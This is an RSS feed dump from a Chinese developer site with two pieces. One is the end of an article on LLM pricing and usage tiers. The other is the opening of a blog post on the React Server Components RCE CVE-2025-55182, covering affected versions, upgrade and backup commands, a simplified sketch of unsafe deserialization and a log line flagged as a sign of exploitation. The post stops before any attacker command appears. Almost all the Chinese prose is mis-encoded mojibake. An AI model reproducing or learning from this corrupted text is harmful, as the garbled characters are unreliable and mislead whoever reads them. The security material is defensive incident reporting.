æ•°æ®ä¸­æœ‰ä¸€ä¸ªéå¸¸æ˜¾çœ¼çš„å¼‚å¸¸å€¼â€”â€”<strong>â€œæŠ€æœ¯ï¼ˆTechnologyï¼‰â€<strong>ç±»ä»»åŠ¡ï¼ˆæŒ‡ç³»ç»Ÿæ¶æ„ã€å¤æ‚æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡ç­‰ï¼‰ã€‚å®ƒçš„</strong>å•ä»·æé«˜</strong>ï¼Œè¿œè¶…å…¶ä»–ç±»åˆ«ï¼Œä½†<strong>ä½¿ç”¨é‡ä¾ç„¶å¾ˆå¤§</strong>ã€‚è¿™è¯´æ˜ç”¨æˆ·ä¸ºäº†è§£å†³å¤æ‚çš„ç¡¬æ ¸æŠ€æœ¯é—®é¢˜ï¼Œéå¸¸æ„¿æ„æ”¯ä»˜é«˜ä»·ã€‚å¯¹æ¨¡å‹å‚å•†æ¥è¯´ï¼Œè¿™æ˜¯åˆ©æ¶¦æœ€ä¸°åšçš„ä¸€å—è‚¥è‚‰ã€‚</p>
</li>
<li>
<p><strong>é‡‘èå’ŒåŒ»ç–—ï¼šä½é¢‘ä½†é«˜ä»·</strong>
é‡‘èã€å­¦æœ¯ã€åŒ»ç–—ç­‰ä¸“ä¸šé¢†åŸŸçš„ç‰¹ç‚¹æ˜¯**â€œç”¨çš„å°‘ï¼Œä½†ç»™é’±å¤šâ€**ã€‚ç”¨æˆ·ä¸ä¼šåƒå†™ä»£ç é‚£æ ·å¤©å¤©é—®ï¼Œä½†å› ä¸ºå¯¹å‡†ç¡®æ€§å’Œä¸“ä¸šåº¦è¦æ±‚æé«˜ï¼Œä¸€æ—¦éœ€è¦ä½¿ç”¨ï¼Œä»–ä»¬æ„¿æ„ä¸ºæ˜‚è´µçš„é«˜ç«¯æ¨¡å‹ä»˜è´¹ã€‚</p>
</li>
<li>
<p><strong>ç¿»è¯‘å’Œæ³•å¾‹ï¼šä½ä»·ä¸”ä½é¢‘</strong>
ç¿»è¯‘ã€æ³•å¾‹å¸¸è¯†å’Œå†·çŸ¥è¯†é—®ç­”å±äº<strong>ä½æˆæœ¬ã€ä½æµé‡</strong>åŒºåŸŸã€‚è¿™è¯´æ˜è¿™ç±»ä»»åŠ¡å·²ç»è¢«â€œå•†å“åŒ–â€äº†ï¼ŒæŠ€æœ¯é—¨æ§›ä¸é«˜ï¼Œç”¨æˆ·è§‰å¾—ç”¨ä¾¿å®œçš„æ¨¡å‹éšä¾¿è·‘è·‘å°±å¤Ÿç”¨äº†ï¼Œä¸éœ€è¦èŠ±å¤§ä»·é’±ã€‚</p>
</li>
</ul>
<h2 data-id="heading-13">åå››ã€ä»·æ ¼ä¸ç”¨é‡çš„å…³ç³»ï¼šä¾¿å®œæœªå¿…æœ‰äººä¹°ï¼Œè´µä¹Ÿæœ‰äººæŠ¢</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b1642582e1342d1946631c14669f758~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=n%2FM8q9JQvLMQohnus%2BSeBm69Tu4%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>é™ä»·æ¢ä¸æ¥é”€é‡</strong>
æ•°æ®æ˜¾ç¤ºï¼Œæ¨¡å‹å¸‚åœºçš„éœ€æ±‚å¯¹ä»·æ ¼éå¸¸ä¸æ•æ„Ÿã€‚æ•´ä½“æ¥çœ‹ï¼Œä»·æ ¼é™ä½ 10%ï¼Œç”¨é‡æ‰å¢åŠ ä¸åˆ° 1%ã€‚è¿™è¯´æ˜å¤§å®¶é€‰æ¨¡å‹ä¸»è¦çœ‹â€œèƒ½ä¸èƒ½å¹²æˆäº‹â€ï¼Œè€Œä¸æ˜¯å•çº¯å›¾ä¾¿å®œã€‚</p>
</li>
<li>
<p><strong>å¸‚åœºåˆ†æˆäº†å››ç±»</strong></p>
<ul>
<li><strong>é«˜ä»·çˆ†æ¬¾ï¼ˆPremium Leadersï¼‰ï¼š</strong> æ¯”å¦‚ <strong>Claude Sonnet</strong> ç³»åˆ—ã€‚è™½ç„¶ä»·æ ¼ä¸è²ï¼ˆçº¦ $2/ç™¾ä¸‡ tokenï¼‰ï¼Œä½†ç”¨é‡å·¨å¤§ã€‚è¯´æ˜åªè¦æ¨¡å‹è¶³å¤Ÿå¥½ã€è¶³å¤Ÿç¨³ï¼Œç”¨æˆ·æ˜¯æ„¿æ„æé’±çš„ã€‚</li>
<li><strong>æ€§ä»·æ¯”å·¨å¤´ï¼ˆEfficient Giantsï¼‰ï¼š</strong> æ¯”å¦‚ <strong>DeepSeek V3</strong> å’Œ <strong>Gemini Flash</strong>ã€‚ä»·æ ¼ä¾¿å®œï¼ˆä¸åˆ° $0.4ï¼‰ä¸”èƒ½åŠ›å¼ºï¼Œæ˜¯ç›®å‰è·‘å¤§æ‰¹é‡ä»»åŠ¡çš„é»˜è®¤é¦–é€‰ã€‚</li>
<li><strong>é¡¶çº§ä¸“å®¶ï¼ˆPremium Specialistsï¼‰ï¼š</strong> æ¯”å¦‚ <strong>GPT-5 Pro</strong>ã€‚æè´µï¼ˆçº¦ $35ï¼‰ï¼Œç”¨é‡ä¸å¤§ã€‚åªæœ‰åœ¨å¤„ç†æœ€éš¾ã€æœ€å…³é”®ã€ç»å¯¹ä¸èƒ½å‡ºé”™çš„ä»»åŠ¡æ—¶ï¼Œå¤§å®¶æ‰èˆå¾—ç”¨å®ƒã€‚</li>
<li><strong>å»‰ä»·é•¿å°¾ï¼ˆLong Tailï¼‰ï¼š</strong> å¾ˆå¤šå°æ¨¡å‹è™½ç„¶ä¾¿å®œåˆ°å‡ ä¹ç™½é€ï¼Œä½†ä¾ç„¶æ²¡äººç”¨ã€‚å› ä¸ºèƒ½åŠ›ä¸è¡Œæˆ–ä¸å¥½é›†æˆï¼Œå†ä¾¿å®œä¹Ÿæ˜¯æµªè´¹æ—¶é—´ã€‚</li>
</ul>
</li>
<li>
<p><strong>åªæœ‰â€œä¾¿å®œâ€æ˜¯æ²¡ç”¨çš„</strong>
æ•°æ®ç‹ ç‹ æ‰“è„¸äº†â€œä»·æ ¼æˆ˜â€ç­–ç•¥ã€‚å•çº¯æŠŠä»·æ ¼åšåˆ°æä½å¹¶ä¸èƒ½å¸å¼•ç”¨æˆ·ã€‚æ¨¡å‹å¿…é¡»å…ˆè¾¾åˆ°â€œå¥½ç”¨â€çš„åŠæ ¼çº¿ï¼Œä¾¿å®œæ‰æœ‰æ„ä¹‰ã€‚å¦‚æœèƒ½åŠ›ä¸å¤Ÿï¼Œå¼€å‘è€…æ ¹æœ¬ä¸æ•¢æŠŠå®ƒé›†æˆåˆ°äº§å“é‡Œã€‚</p>
</li>
<li>
<p><strong>é—­æºåšâ€œéš¾äº‹â€ï¼Œå¼€æºåšâ€œæ‚äº‹â€</strong>
ç›®å‰å½¢æˆäº†ä¸€ä¸ªæ˜æ˜¾çš„æ ¼å±€ï¼šé—­æºæ¨¡å‹ï¼ˆå¦‚ OpenAI, Anthropicï¼‰è™½ç„¶è´µï¼Œä½†å¤§å®¶ç”¨å®ƒæ¥å¤„ç†é«˜ä»·å€¼ã€é«˜éš¾åº¦çš„æ ¸å¿ƒä»»åŠ¡ï¼›å¼€æºæ¨¡å‹ï¼ˆå¦‚ DeepSeek, Qwenï¼‰å› ä¸ºä¾¿å®œï¼Œå¤§å®¶ç”¨å®ƒæ¥å¤„ç†é‚£äº›å¯¹ç²¾åº¦è¦æ±‚æ²¡é‚£ä¹ˆé«˜ã€ä½†æ•°æ®é‡å·¨å¤§çš„æ—¥å¸¸ä»»åŠ¡ã€‚</p>
</li>
</ul>
<h2 data-id="heading-14">æœ€å</h2>
<p>å…³æ³¨ã€Šcodeç§˜å¯†èŠ±å›­ã€‹ä»æ­¤å­¦ä¹  AI ä¸è¿·è·¯ï¼Œç›¸å…³é“¾æ¥ï¼š</p>
<ul>
<li>æœ¬æŠ¥å‘ŠåŸæ–‡ PDFï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F89788572462d" target="_blank" title="https://pan.quark.cn/s/89788572462d" ref="nofollow noopener noreferrer">pan.quark.cn/s/897885724â€¦</a></li>
<li>AI æ•™ç¨‹å®Œæ•´æ±‡æ€»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwRâ€¦</a></li>
<li>ç›¸å…³å­¦ä¹ èµ„æºæ±‡æ€»åœ¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></li>
</ul>
<p>å¦‚æœæœ¬æœŸå¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¸Œæœ›å¾—åˆ°ä¸€ä¸ªå…è´¹çš„ä¸‰è¿ï¼Œæ„Ÿè°¢å¤§å®¶æ”¯æŒ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182]]></title>    <link>https://juejin.cn/post/7581025279645433894</link>    <guid>https://juejin.cn/post/7581025279645433894</guid>    <pubDate>2025-12-08T04:20:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645433894" data-draft-id="7581004702945280027" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨,React.js"/> <meta itemprop="datePublished" content="2025-12-08T04:20:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cos"/> <meta itemprop="url" content="https://juejin.cn/user/1698115646132254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1698115646132254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cos
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:20:39.000Z" title="Mon Dec 08 2025 04:20:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cosine.ren%2Fpost%2Freact-cve-2025" target="_blank" title="https://blog.cosine.ren/post/react-cve-2025" ref="nofollow noopener noreferrer">blog.cosine.ren/post/react-â€¦</a></p>
<blockquote>
<p>æˆ‘å¯¹å®‰å…¨æ–¹é¢çš„çŸ¥è¯†å¾ˆå°‘ï¼Œæœ¬æ–‡å¤§éƒ¨åˆ†å¯èƒ½æœ‰å¾ˆå¤šé”™æ¼ï¼Œå¦‚æœ‰é”™æ¼å¸Œæœ›èƒ½æŒ‡å‡ºã€‚</p>
</blockquote>
<p>2025 å¹´ 12 æœˆ 3 æ—¥ï¼ŒReact å‘å¸ƒäº†ä¸€ä¸ªå ªæ¯”å½“å¹´ Log4j çš„<strong>ä¸¥é‡å®‰å…¨æ¼æ´</strong>ï¼šCVE-2025-55182ï¼ŒCVSS è¯„åˆ† <strong>10.0 æ»¡åˆ†</strong>ï¼</p>
<p>è¿™æ˜¯ React å†å²ä¸Šæœ€ä¸¥é‡çš„æ¼æ´ä¹‹ä¸€ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆUnauthenticated RCEï¼‰ã€‚</p>
<p>åˆšæ”¶åˆ°å®‰å…¨é€šå‘Šï¼Œæˆ‘å°±é©¬ä¸Šæ›´æ–°äº†æ‰€æœ‰å·²çŸ¥çš„ Next.js å’Œ React åº”ç”¨ï¼Œä»¥ä¸ºè¿™äº›åº”è¯¥æ²¡äº‹å„¿äº†ã€‚</p>
<p>ç»“æœä»Šå¤©çªç„¶å‘ç°è‡ªå»ºçš„ Umami æœåŠ¡ 504 äº†æ‰æƒ³èµ·æ¥ï¼Œæ²ƒæ—¥ï¼Œå®ƒæ˜¯ Nextjs å†™çš„å•Šï¼ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e783364bc2c3499ebc2e2b3977b54008~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772438&amp;x-signature=834nkbJcqi5MWU0EAEzDhQrm1Hg%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶æ˜¯åœ¨ docker é‡Œè·‘çš„ï¼Œå¹¶ä¸”ç‚¸çš„æ˜¯æˆ‘ä¸€ä¸ªä¸å¸¸ç”¨çš„æœåŠ¡å™¨ï¼Œæœ€å¤§çš„æŸå¤±æ˜¯ CPU å ç”¨ç‡çªç„¶é£™åˆ° 100% äº†ä¸€æ®µæ—¶é—´ï¼Œç»Ÿè®¡æ•°æ®ä¸¢äº†ä¸å°‘ï¼Œå¯†ç ä»€ä¹ˆçš„éƒ½æ˜¯éšæœºç”Ÿæˆçš„ï¼Œæ¢å°±å¥½äº†ã€‚</p>
<p>éšä¾¿æ‰¾äº†ä¸€ç¯‡åšå®¢çœ‹çœ‹åˆ«äººçš„æƒ…å†µï¼š</p>
<p><a href="https://juejin.cn/post/7580374090365665318" target="_blank" title="https://juejin.cn/post/7580374090365665318">juejin.cn/post/758037â€¦</a></p>
<h2 data-id="heading-0">è§£å†³æ–¹æ¡ˆ</h2>
<p>å…ˆæŠŠæœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆæ”¾åˆ°æœ€å‰é¢ã€‚</p>
<p>å‡çº§ Umamiï¼Œé¦–å…ˆä½¿ç”¨ pg_dump å¤‡ä»½ Umami çš„ PostgreSQL æ•°æ®åº“ã€‚è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤‡ä»½åˆ°å½“å‰ç›®å½•</span>
docker <span class="hljs-built_in">exec</span> umami-db-1 pg_dump -U umami umami &gt; umami_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S).sql

<span class="hljs-comment"># æˆ–è€…å¤‡ä»½åˆ°æŒ‡å®šç›®å½•</span>
docker <span class="hljs-built_in">exec</span> umami-db-1 pg_dump -U umami umami &gt; ~/backups/umami_$(<span class="hljs-built_in">date</span> +%Y%m%d).sql
</code></pre>
<p>ç„¶åï¼Œå› ä¸ºæˆ‘æ˜¯ docker-compose éƒ¨ç½²çš„ï¼Œç›´æ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker compose pull
docker compose up --force-recreate -d
</code></pre>
<p>å°±å¯ä»¥äº†ï¼ŒæŸ¥çœ‹å®¹å™¨æ—¥å¿—ä¸­çš„ Next.js å·²ç»æ˜¯ 15.5.7 ç‰ˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c72ed119ee4460ca40ae3e1ab756abb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772438&amp;x-signature=q%2BInUj%2FyhqB5By5yASac7uX386o%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ æ•°æ®åº“ä½¿ç”¨çš„æ˜¯ mysql çš„è¯ï¼Œé‚£ä¸è¦å‡ 3ï¼Œçœ‹å®˜æ–¹çš„è¿ç§»æ•™ç¨‹</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.umami.is%2Fdocs%2Fguides%2Fmigrate-mysql-postgresql" target="_blank" title="https://docs.umami.is/docs/guides/migrate-mysql-postgresql" ref="nofollow noopener noreferrer">docs.umami.is/docs/guidesâ€¦</a></p>
<h2 data-id="heading-1">æ¼æ´èƒŒæ™¯</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">www.cve.org/CVERecord?iâ€¦</a></p>
<ul>
<li><strong>CVE ç¼–å·</strong>: CVE-2025-55182</li>
<li><strong>CVSS è¯„åˆ†</strong>: 10.0 / 10.0ï¼ˆCriticalï¼‰</li>
<li><strong>æ¼æ´ç±»å‹</strong>: æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆUnauthenticated RCEï¼‰</li>
<li><strong>æŠ«éœ²æ—¶é—´</strong>: 2025 å¹´ 12 æœˆ 3 æ—¥</li>
<li><strong>å®˜æ–¹å…¬å‘Š</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React Blog</a></li>
</ul>
<h3 data-id="heading-2">å—å½±å“çš„ç‰ˆæœ¬</h3>
<p><strong>React æ ¸å¿ƒåŒ…ï¼ˆ19.x ç‰ˆæœ¬ï¼‰</strong>:</p>
<p>19.0, 19.1.0, 19.1.1 å’Œ 19.2.0</p>
<ul>
<li>react-server-dom-webpack</li>
<li>react-server-dom-parcel</li>
<li>react-server-dom-turbopack</li>
</ul>
<p><strong>å—å½±å“çš„æ¡†æ¶</strong>:</p>
<ul>
<li><strong>Next.js</strong>: 14.3.0-canary.77 åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œ15.x, 16.x å…¨éƒ½éœ€è¦å‡åˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>React Router: ä½¿ç”¨ unstable RSC APIs çš„ç‰ˆæœ¬</li>
<li>Waku: ä½¿ç”¨ RSC çš„ç‰ˆæœ¬</li>
<li>Expo: ä½¿ç”¨ RSC çš„ç‰ˆæœ¬</li>
<li>Redwood SDK: &lt; 1.0.0-alpha.0</li>
</ul>
<h3 data-id="heading-3">æ¼æ´åŸç†</h3>
<p>React Server Functions å…è®¸å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡å™¨ä¸Šçš„å‡½æ•°ã€‚React å°†å®¢æˆ·ç«¯è¯·æ±‚è½¬æ¢ä¸º HTTP è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ç«¯ React å†å°† HTTP è¯·æ±‚<strong>ååºåˆ—åŒ–</strong>ä¸ºå‡½æ•°è°ƒç”¨ã€‚</p>
<p><strong>å…³é”®é—®é¢˜</strong>ï¼šæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ HTTP è¯·æ±‚åˆ°ä»»ä½• React Server Function ç«¯ç‚¹ï¼Œå½“ React ååºåˆ—åŒ–è¿™äº› payload æ—¶ï¼Œä¼šè§¦å‘<strong>ä»»æ„ä»£ç æ‰§è¡Œ</strong>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç®€åŒ–çš„æ¼æ´ç¤ºæ„ï¼ˆå®é™…æ›´å¤æ‚ï¼‰</span>
<span class="hljs-comment">// æœåŠ¡å™¨ç«¯çš„ React Server Function å¤„ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleServerFunctionRequest</span>(<span class="hljs-params">payload</span>) {
  <span class="hljs-comment">// âŒ å±é™©ï¼šç›´æ¥ååºåˆ—åŒ–æœªéªŒè¯çš„ payload</span>
  <span class="hljs-keyword">const</span> deserializedData = <span class="hljs-title function_">deserialize</span>(payload);

  <span class="hljs-comment">// å¦‚æœ payload è¢«ç²¾å¿ƒæ„é€ ï¼Œè¿™é‡Œå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç </span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">executeFunction</span>(deserializedData);
}
</code></pre>
<p><strong>å…³é”®å¨èƒ</strong>ï¼š</p>
<ul>
<li>æ— éœ€èº«ä»½éªŒè¯ï¼ˆUnauthenticatedï¼‰</li>
<li>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</li>
<li>å³ä½¿æ²¡æœ‰å®šä¹‰ä»»ä½• Server Functionï¼Œåªè¦ä½¿ç”¨äº† React Server Components å°±æœ‰é£é™©</li>
</ul>
<h2 data-id="heading-4">æ”»å‡»æ‰‹æ®µ</h2>
<p>æ—¢ç„¶æ”»å‡»éƒ½å·²ç»æ”»å‡»äº†ï¼Œé‚£ä¸å¦‚è¶æœºè®© AI åˆ†æå®¹å™¨æ—¥å¿—ï¼Œå€Ÿæ­¤æœºä¼šæ·±å…¥åˆ†æä¸€ä¸‹æ”»å‡»è€…åˆ°åº•æƒ³å¹²ä»€ä¹ˆã€‚</p>
<p><strong>ä»¥ä¸‹æ”»å‡»æ‰‹æ®µæ±‡æ€»ç­‰ï¼Œå…¨ä¸º Claude Sonnet 4.5 æ ¹æ®æ—¥å¿—æ–‡ä»¶è¿›è¡Œåˆ†æå¾—å‡ºçš„æ€»ç»“ï¼Œå¦‚æœ‰é”™æ¼ï¼Œè¿˜è¯·æŒ‡å‡ºã€‚</strong></p>
<h3 data-id="heading-5">æ”»å‡»å…¥å£ï¼šReact Server Components RCE</h3>
<p>ä»æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°å¤§é‡çš„ <code>NEXT_REDIRECT</code> é”™è¯¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"> â¨¯ Error: NEXT_REDIRECT
    at Object.<span class="hljs-built_in">eval</span> [as <span class="hljs-keyword">then</span>] (node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:92:34014) {
  digest: <span class="hljs-string">'12334\nMEOWWWWWWWWW'</span>
}
</code></pre>
<p><strong>è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ ‡å¿—æ€§ç‰¹å¾</strong>ï¼š</p>
<ul>
<li><code>digest: '12334\nMEOWWWWWWWWW'</code> - è¿™ä¸æ˜¯æ­£å¸¸çš„é”™è¯¯æ‘˜è¦</li>
<li>æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„ payload è§¦å‘ React Server Components çš„ååºåˆ—åŒ–æ¼æ´</li>
<li>æ¯æ¬¡ NEXT_REDIRECT é”™è¯¯åéƒ½è·Ÿç€ä¸€ç³»åˆ—çš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå°è¯•</li>
</ul>
<h3 data-id="heading-6">æ¼æ´åˆ©ç”¨ä¸åˆå§‹è®¿é—®</h3>
<p>æ”»å‡»è€…é¦–å…ˆåˆ©ç”¨ CVE-2025-55182 è·å¾—ä»£ç æ‰§è¡Œèƒ½åŠ›ï¼Œç„¶åç«‹å³å°è¯•ä¸‹è½½åé—¨ç¨‹åºï¼š</p>
